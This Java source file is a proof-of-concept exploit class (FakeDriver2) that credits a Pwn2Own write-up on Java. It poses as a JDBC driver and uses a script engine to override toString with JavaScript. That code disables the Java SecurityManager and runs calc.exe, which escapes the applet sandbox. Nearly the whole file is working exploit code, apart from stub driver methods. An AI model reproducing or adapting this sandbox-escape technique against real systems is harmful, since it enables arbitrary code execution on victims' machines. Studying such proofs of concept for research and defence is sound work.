/*
Proof-of-Concept exploit by axt based on the writeup by James Forshaw

http://www.contextis.com/research/blog/java-pwn2own/
http://axtaxt.wordpress.com
*/
import java.security.AccessControlContext;
import java.security.AccessController;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverPropertyInfo;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.AbstractSet;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Properties;
import java.util.logging.Logger;

import javax.script.ScriptEngine;
import javax.script.ScriptException;


public class FakeDriver2 extends HashSet implements Driver {
	
	static {
		MainApplet.log("FakeDriver2 class loaded");
	}

	public FakeDriver2() {
		ScriptEngine e = (ScriptEngine)FakeDriver1._sl.iterator().next();
		MainApplet.log("E.CN:"+e.getClass().getName());
		MainApplet.log("E.CL:"+e.getClass().getClassLoader());
		System.out.println("SE:" + e);
		try {
			Object proxy = e.eval(
					"this.toString = function() { " +
					"   try {"+
					"   java.lang.System.out.println('toString called ');" +
					"   java.lang.System.out.println(this);" +
					"	java.lang.System.setSecurityManager(null);" +
					"	java.lang.Runtime.getRuntime().exec(\"calc.exe\");"+
					"	} catch(ex) {" +
					"		java.lang.System.out.println(ex);" +
					"	}" +
					"	return '';" +
					"};"+
					"e = new Error();"+
					"e.message = this;" +
					"e");
			this.add(proxy);
		} catch (Exception ex) {
			MainApplet.log("EX:"+ex.getMessage());
		}
	}
	
	@Override
	public Connection connect(String url, Properties info) throws SQLException {
		return null;
	}

	@Override
	public boolean acceptsURL(String url) throws SQLException {
		return false;
	}

	@Override
	public DriverPropertyInfo[] getPropertyInfo(String url, Properties info)
			throws SQLException {
		return null;
	}

	@Override
	public int getMajorVersion() {
		return 0;
	}

	@Override
	public int getMinorVersion() {
		return 0;
	}

	@Override
	public boolean jdbcCompliant() {
		return false;
	}

	@Override
	public int size() {
		return 0;
	}

	@Override
	public Logger getParentLogger() throws SQLFeatureNotSupportedException {
		// TODO Auto-generated method stub
		return null;
	}

}
